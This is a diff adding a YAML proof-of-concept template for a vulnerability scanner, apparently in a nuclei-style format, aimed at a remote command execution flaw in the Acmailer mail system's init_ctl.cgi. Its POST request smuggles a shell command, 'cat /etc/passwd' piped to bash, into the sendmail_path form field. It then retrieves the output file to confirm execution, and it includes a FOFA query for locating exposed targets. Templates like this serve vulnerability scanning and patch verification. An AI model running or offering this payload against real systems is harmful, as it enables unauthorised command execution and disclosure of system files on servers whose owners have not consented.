@@ -1,0 +1,23 @@
+id: poc-yaml-acmailer-mail-system-init-ctl-cgi-rce
+info:
+  name: Acmailer邮件系统 init_ctl.cgi 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: acmailer
+  fofa: body="CGI acmailer"
+variables:
+  t1: random_str(5)
+requests:
+- method: POST
+  path: /init_ctl.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|cat
+    /etc/passwd >{{.t1}}.txt | bash&homeurl=http://&mypath=e
+  expression: status_code == 302
+- method: GET
+  path: /{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
